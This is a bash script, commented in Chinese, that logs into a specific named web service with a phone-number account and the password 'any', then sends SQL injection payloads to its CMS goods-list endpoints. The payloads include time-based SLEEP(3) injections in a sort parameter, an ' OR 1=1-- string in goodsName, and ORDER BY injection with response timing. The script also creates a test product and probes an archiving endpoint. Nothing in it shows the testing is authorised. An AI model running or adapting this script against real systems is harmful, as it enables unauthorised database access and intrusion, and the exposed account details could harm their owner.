#!/bin/bash

TOKEN=$(curl -sk "http://longnows-gts.t.kkgroup.cn/pms/api/v1/pmsUser/login" -X POST \
  -H "Content-Type: application/json" \
  -d '{"account":"19129430218","password":"any"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['accessToken'])")

sign_request() {
  REQUEST_ID=$(uuidgen | tr '[:upper:]' '[:lower:]')
  TIMESTAMP=$(date +%s000)
  NONCE=$(echo -n "${REQUEST_ID}${TIMESTAMP}" | md5)
  echo "$REQUEST_ID|$TIMESTAMP|$NONCE"
}

# ===== CMS List端点 SQL注入测试 =====
echo "====== CMS List端点 SQL注入测试 ======"

# 测试1: list endpoint - sort参数注入
echo ""
echo "--- 测试1: list endpoint sort参数注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime'"'"' OR SLEEP(3)--","order":"desc"}' 2>&1

# 测试2: list endpoint - 条件注入
echo ""
echo "--- 测试2: list endpoint goodsName注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"goodsName":"'"'"' OR 1=1--"}' 2>&1

# 测试3: 创建商品 - 然后尝试list注入
echo ""
echo "--- 测试3: sort参数 ORDER BY 注入 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
START_TIME=$(date +%s%N)
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"sort":"createTime AND SLEEP(3)","order":"desc"}' 2>&1
END_TIME=$(date +%s%N)
echo "请求耗时: $(( (END_TIME - START_TIME) / 1000000 ))ms"

# 测试4: create endpoint - 尝试使用已有的"确认保存"能力
echo ""
echo "--- 测试4: 创建商品后查看list中是否有注入效果 ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/enterpriseGoods/create" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{"materialNo":"TEST002","goodsName":"测试商品","firstUnit":"035","dclUnit":"035","codeTs":"0101210010","goodsModel":"0:品牌类型|1:出口享惠情况","regulatoryCondition":"AFEB","tradeBan":"出口","ciqType":"P/Q","operationType":"1","currency":"142","confirm":"1"}' 2>&1

# 测试5: 检查其他端点 - archiving
echo ""
echo "--- 测试5: POST /cms/api/v1/archiving/list ---"
IFS="|" read -r RID TS NONCE <<< "$(sign_request)"
curl -sk "http://longnows-gts.t.kkgroup.cn/cms/api/v1/archiving/list" -X POST \
  -H "Content-Type: application/json;charset=UTF-8" \
  -H "authorization: ${TOKEN}" \
  -H "language: zh_CN" \
  -H "x-ca-timestamp: ${TS}" \
  -H "x-ca-nonce: ${NONCE}" \
  -H "x-request-id: ${RID}" \
  -d '{}' 2>&1